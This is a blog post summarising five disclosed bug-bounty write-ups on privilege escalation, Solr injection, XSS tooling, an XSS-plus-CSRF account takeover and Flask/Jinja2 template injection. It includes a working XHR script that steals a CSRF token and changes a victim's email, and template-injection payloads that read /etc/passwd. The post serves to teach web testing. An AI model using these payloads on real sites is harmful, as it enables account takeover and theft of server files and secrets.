---
layout: post
title:  Bug-Bounty-Writeups-Summary-3
date:   2019-10-30 
categories: Bug-Bounty-Writeups-Summarry
comments: false
---
Hello friends, Here is Part 3 of Bug Hunting Writeup Summary ->

### 1. https://medium.com/@ronak_9889/privilege-escalation-using-api-endpoint-fce841caaff3

Privilege Escalation using Api endpoint - By Ronak Patel

**Privilege Escalation** is the way to get resources or access to more resources or functionality of higher/admin user to as a normal user

Mean we can access resources of admin functionality as a normal user if there is a flaw in Privilege Escalation

OR, We can say when a normal user gain or bypass higher-level  permissions that is called as **Privilege Escalation**

Reference :-> [https://www.owasp.org/index.php/Testing_for_Privilege_escalation_(OTG-AUTHZ-003)](https://www.owasp.org/index.php/Testing_for_Privilege_escalation_(OTG-AUTHZ-003))

Now back to writeup and here is KeyLearn from writeup -->

* The application got to Author had Test Accounts to test application  and that test accounts  has **Normal User Level Permission**

* Application Functionality was ::>
    * Provide Employee background check service
    * With Normal User Permission we can only **create candidate,read reports and manage reports** ....

* After spending some time he saw that Application using AngularJS as a client side Javascript Framework

* So, he used **Developer console** Tool and read Application JS File to see things like **routing,permissions and endpoint available**

* He read code, and got that application has **Functionality** to **create Webhook** to **recieve candidate reports** and more notifications

![Create Webhook Endpoint](https://miro.medium.com/max/1060/1*8gh_Oe1RK97lH-3PPXyI_g.jpeg)


* So, he decided to check which permission is required to create webhooks , and he got that thing in **manage_dev_settings** permission which is by default assigned to only **admin** users. 

![Manage_dev_permission](https://miro.medium.com/max/555/1*U5ySzMUzkidfKHFsufmJ6A.png)


* By checking that code he thought that this setting is  in the client side check, so he thought to edit this setting by intercepting the request n response  which contains user permissions.

* **"api.example.com/user"** this contains user permission from the response which he got after login again and intercept using burpsuite

![response with user permission](https://miro.medium.com/max/1334/1*kxJ8kb0MhFRY4GGDCN0u9g.png)


* He changed the **"manage_dev_settings"** from **false** to **true** and forwarded the response

* So, now he got the UI level access of the developer settings with the normal user test account

* Now, he navigated to creat webhook functionality and created webhook with the **requestbin link** and created new candidate which generated post request to the endpoint **"api.example.com/v1/webhook"**. 

* He found that there is no permission validation at server level and webhook created successfully. He created new candidate and received webhook log on his requestbin link


![Webhook Log](https://miro.medium.com/max/1230/1*GEOM3VyHrahmCkC9LyTl9w.jpeg)

* This is how he able to create webhook and recieve notification with the normal user permission by Escalating Privileges

So, What we learn from this writeup is that we need to check Both Server Side Validation Check and Client Side Validation Check whether as a security on server side can we bypass on client side OR  as a security on client side can we bypass on server side

****

### 2. https://medium.com/@ronak_9889/solr-injection-by-abusing-local-parameters-on-zomato-com-a5cb7bef10d5
 
Solr Injection by abusing Local Parameters on Zomato.com - By Ronak Patel

First of all the Author didn't able to exploit the behaviour but we can learn what he did and his way of testing applications


Here is Key Summary of Writeup ->

* He always first test applications which having functionality, mean he checking every functionality of application and observer each request and response using BURPSUTIE

* On the main page of zomato.com , there is  link to **Order Food** which has the search functionality to allow users to search restaurants and cuisines in our location.

![](https://miro.medium.com/max/1322/1*yHMg42f6z2NnIHFnIf6mLQ.png)


* While searching for the restaurant, it generated request to the endpoint ->

        https://www.zomato.com/php/delivery_live_suggest.php?q=restaurant &delivery_subzone_id=number&


* He thought to try SQL Injection after seeing **delivery_subzone_id** parameter

* He tested single quotes,double quotes and random strigns on parameter **delivery_subzone_id**  for SQL Injection

* He saw that when use Even Double Quotes[ "" or """"] Response is 200 OK but with Odd Double Quotes [ """ or " ] Response is 500 Internal Server Error.

* This is the strong indication that our double quotes are being injected on query.

* After confirmation of SQLI by observe error , next step is to identify Database or Technology or which kind of query it could be in backend where our input is being injected.

* He used this link [Manual SQL Injection Discovery Tips by Gerben Javado](https://gerbenjavado.com/manual-sql-injection-discovery-tips/?source=post_page-----a5cb7bef10d5----------------------) but he failed

* But, he reported this behaviour of error to zomato and zomato security researcher told him that this was Solr Injection  which is search platform built by apache

* Here is the link for Solr Injection ->

[Abusing the Solr local parameters feature - LocalParams injection](https://javahacker.com/abusing-the-solr-local-parameters-feature-localparams-injection/?source=post_page-----a5cb7bef10d5----------------------)


***

### 3. https://medium.com/@rrubymann/how-to-easily-find-reflected-xss-vulnerabilities-6377ab6f3e1f


How to easily find Reflected XSS vulnerabilities! -  By Mehdi Esmaeilpour

This is not a bug writeup but a Tutorial to find Reflected XSS Using Burpsuite Tools

Let's see what he did use ->

He used Burpsuite Pro extensions -> 

    Reflected Parameters
    XSS Vlidator
    [PhantomJS](https://phantomjs.org/download.html)
    https://github.com/elkokc/reflector
    https://github.com/PortSwigger/xss-validator



It's better to see Usage guide of those from that tutorial

***

### 4. https://medium.com/@mastomi/xss-to-account-takeover-d5beddc5c704

XSS to Account Takeover - By Tomi

This writeup is very useful to read and learn from it. It's better to read this writeup from there and understand it carefully.

Though, I still write key summary of writeup in my blog so that i have reference to learn from this writeup for Future


Here is Key Summary of Writeup :->

* He got Stored XSS, but when he tried to grab cookie using "document.cookie as xss Payload he got nothing, pop up comes but it didn't display cookie data there ->

![](https://miro.medium.com/max/500/0*2_tbeYJbnr_2yrrq.png)

* Best thing of Author here is he didn't Give up and and report and he tried to dig dipper to get cookies

* Why cookie didn't show up there ? Becuase of this flag was present in cookie -> **HTTPOnly**

* When there is **HTTPOnly** flag , we can't access Javascript there and hence can't get cookie value

* Author told us that when we got something like this, our next Option is **to make a request  using XHR** to force users to take sensitive actions without their knowledge, like change email, change password and this si what CSRF Comes in Mind.


* Here is the Post Request of change email ->


```
POST /user/changeEmail HTTP/1.1
Host: redacted.com
Connection: close
Content-Length: 84
Sec-Fetch-Mode: cors
csrf-token: 3005c34f-4cea-4470-afe8-045f1c14a2af
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Content-Type: application/json; charset=UTF-8
Accept: */*
Sec-Fetch-Site: same-origin
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
Cookie: JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=3005c34f-4cea-4470-afe8-045f1c14a2af;

{"email":"pwn@1337.com"}

```

* He observed  **CSRF Token** in that Post request of changeEmail  which is use to Prevent CSRF Attacks.

* Also there is csrf-token two times, One is in Cookie and second is as Header

* Also CSRF Header changes every time  a request is made.

* But value of CSRF-Token in Header and in Cookie  is same

* So, he changed the value with same value ->

```
POST /user/changeEmail HTTP/1.1
Host: redacted.com
Connection: close
Content-Length: 84
Sec-Fetch-Mode: cors
csrf-token: asu
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Content-Type: application/json; charset=UTF-8
Accept: */*
Sec-Fetch-Site: same-origin
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
Cookie: JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=asu;

{"email":"pwn@1337.com"}
```


* Notice -> csrf-token=asu  both same in Header and in Cookie

* Response he got is ->
            
            {"changingEmailCompleted":true}

* It's indicate that email is changed Successfully. It's mean  we can manipulate the **csrf-token** in the **header** to anything as long as the value is same as the **csrf-token** in the **Cookie**

* Now, Author's next step is to add new Cookie because he can't access cookies, so he create new cookie using script ->

    ```<script>document.cookie="csrf-token=asu";</script>```

* But, when he made a request, he got response as **"Possible CSRF attack detected"**

* Why that happened?, he Noticed that there is **two** times **csrf-token** appeared in **Cookie Header**

```
POST /user/changeEmail HTTP/1.1
Host: redacted.com
Connection: close
Content-Length: 84
Sec-Fetch-Mode: cors
csrf-token: asu
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Content-Type: application/json; charset=UTF-8
Accept: */*
Sec-Fetch-Site: same-origin
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
Cookie: csrf-token=asu; JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=0b84028f-35de-4bd6-bf72-a0a776a7b3f2;

{"email":"pwn@1337.com"}

```


* He checked that Target is using "AngularJS", and there is no csrf-token value stored in the HTML Code, and the value of the Cookie changes every time.

* **always changing every request** This means that there are times when the server sends a **new cookie** to the browser

* So, he tried to find out when that moment happened

* He found out -> /token endpoint as background request for that purpose

``` 
Request ->

POST /token HTTP/1.1
Host: redacted.com
Connection: close
Content-Length: 84
Sec-Fetch-Mode: cors
csrf-token: 0b84028f-35de-4bd6-bf72-a0a776a7b3f2
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Content-Type: application/json; charset=UTF-8
Accept: */*
Sec-Fetch-Site: same-origin
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
Cookie: JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=0b84028f-35de-4bd6-bf72-a0a776a7b3f2;
```

```
Response ->

HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8
Connection: close
Date: Fri, 04 Oct 2019 15:08:38 GMT
Server: nginx
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Set-Cookie: csrf-token=725d97de-550d-4644-9579-d4b3e1209ded; path=/; secure; HttpOnly
X-XSS-Protection: 1; mode=block
Pragma: no-cache
csrf-token: 725d97de-550d-4644-9579-d4b3e1209ded
Content-Security-Policy: frame-ancestors 'self'
X-Content-Type-Options: nosniff
[...]

```

* So, he concluded that when making a request to endpoint **/token** , the server make a **new csrf-token cookie** 

* So, we need this request to **retrieve the csrf-token**

* He used this script for such purpose ->

```
var xhr = new XMLHttpRequest();
var method = 'GET';
var url = 'https://redacted.com/token';
xhr.open(method,url,true);
xhr.send(null);

xhr.onreadystatechange = function()
{
 var token = xhr.getResponseHeader('csrf-token');
 alert(token);
}
```

* And he got the CSRF-Token 

![](https://miro.medium.com/max/500/0*S0FlClsV3LTmQ3ty.png)


Perfect


* Now, he combined it with request to change the email address ->

```
var xhr = new XMLHttpRequest();
var method = 'GET';
var url = 'https://redacted.com/token';
xhr.open(method,url,true);
xhr.send(null);

xhr.onreadystatechange = function()
{
 var token = xhr.getResponseHeader('csrf-token'); // ngambil token dari response header

 xhr.open("POST","https://redacted.com/user/changeEmail", true);
 xhr.withCredentials="true";
 xhr.setRequestHeader("csrf-token", token);
 xhr.setRequestHeader("Content-type", "application/json; charset=UTF-8");
 xhr.send('{"email":"pwn@1337.com"}');
}
alert('Ups, You\'re pwned!');
```

<br>And, he got this result ->

![](https://miro.medium.com/max/1965/0*Xz8bhqLh7R3xzw2s.png)


<br><br>
Here is the Conclusion of Writeup from Author ->

1. When finding a Stored XSS but cannot get a cookie, don’t report it immediately because it is likely that the severity will decrease.
2. Try to do chaining with other bugs, CSRF for example to perform sensitive actions.
3. When finding CSRF Protection, try to delete it or change its value to null, sometimes something magical can work.
4. Look for other endpoints that can be used to obtain a valid CSRF Token.


This is the fantastic writeup.

***
### 5. https://medium.com/@akshukatkar/rce-with-flask-jinja-template-injection-ea5d0201b870

RCE with Flask Jinja Template Injection - By Akshay Katkar

Well, this is very awesome writeup and we can learn RCE using flask jinja template injection.

Here is the Key Learn from writeup ->

* The program which he got was private , and  had not large scope, just a single app with lots of features to test

* First, The Author tried to know Technology used by Target  using "**Wappalyzer**" add-on 

*  The Target was using Angular dart , python Django & flask

* So, whenever we see python related technologies like Flask and Django , we must try flask ninja template injection as a TRY

* The author knows Python very well and having a good experience with it, and know where developer makes mistake

* The Target have One **Utility** named as **work flow builder**, which is use to build  a financial close process flow. We can Automate daily activities with it like sending approval & sending reminder emails

* Sending Email Functionality , Author said that most of the times e**mail generator apps** are **vulnerable** to **Template Injection**

* Author thought of target sing Jinja2 template as target was built with Python

* Send Email functions have 3 Fields -><br>
a) To<br>
b) Title<br>
c) Description<br>

* He used Payload -> ```{{7*7}}``` in Title and Description field and click on send email buttion.

* He got email as **"49"** in Subject and **"{{7*7}}"** as Description. That mean Subject field is vulnerable to Template Injection

![](https://miro.medium.com/max/1111/1*DPLFosKmDKcxqKSkw9J2Zw.png)

<br>

* ```{{7 * 7}}``` -> what this doing is evaluating python code inside curly brackets

* Now, he tried another payload to get list of sub classes of object class

```
Payload : {{ [].__class__.__base__.__subclasses__() }}
```
<br>
Response He got like this -><br>

![](https://miro.medium.com/max/1509/1*k__m6Ah1EvCEmDL-18aecQ.png)

<br><br>

* Now, the best part is Author explain the code above he used ->

```
1. []  
This is used to create list in Python

2. [].__class__
<type 'list'>   #return class of list

List is sub class of “object” class.

3. Access sub classes of object class .

[].__class__.__base__.__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>.....

This payload gives us a list of all sub classes “object” class.

```
<br><br>
* Now to make this vulnerability to P1 he need to provide POC of using commands like '/etc/passwd' , 'id', 'whoami' etc

<br><br>

* Author told us that -> 
<br>

"**Most of django apps have config file which contains really sensitive info like AWS keys , API’s & encryption keys.**" 

<br>

* Author already knew path of config file becuase of his previous findings, So for this writeup POC, he decided to read a file. [/etc/passwd]

<br><br>

* So, to read a file in Python we have to create object of **"file"**.

```
[].__class__.__base__.__subclasses__().index(file)
40  #return index of "file" object
```

<br>this payload in python interpreter we will get index of “file” object

* When he tried that payload didn't work. He got error like this -><br><br>

<br>

![](https://miro.medium.com/max/1075/1*CLXJs210jIR0nQXjTT2cjw.png)

<br>

* Next he tried to directly access file object like this ->
```

{{[].__class__.__base__.__subclasses__()[40] }}

```
<br>

But again failed.

* It's mean Payload is breaking somewhere.After some try he concluded that may be indexing is block or breaking his payload

* So, Author now told us that in Python to return  a value of list "pop" method is use.
As example ->

<br>

```
>>> [1,2,3,4,5].pop(2)
3
```

<br>

* Base on that he created payload like ->

```
{{[].__class__.__base__.__subclasses__().pop(40) }}

```

That payload gave  object of **"file"**

<br>

![](https://miro.medium.com/max/1239/1*WqZboWvRQfrEbRQeBR2sIg.png)
<br>

* Now for read "/etc/passwd" ->

```
{{[].__class__.__base__.__subclasses__().pop(40)('etc/passwd').read() }}

```

![](https://miro.medium.com/max/1114/1*QpfhUYMZ5Unug8qzu69KFA.png)
<br>

* So, now we can read "/etc/passwd" file on server.

* Now author can read local files on the GCE instance responsible for sending notifications, including some source code, and configuration files containing very sensitive values (e.g. API and encryption keys).
<br>

This is very superb writeup by Akshay Katkar, We learn many things from this writeup

<br>

Like , first anyalyze the target technologies, understand the application functionalities, understand python usages for read file and when stuck tried some experiments instead of giving up.



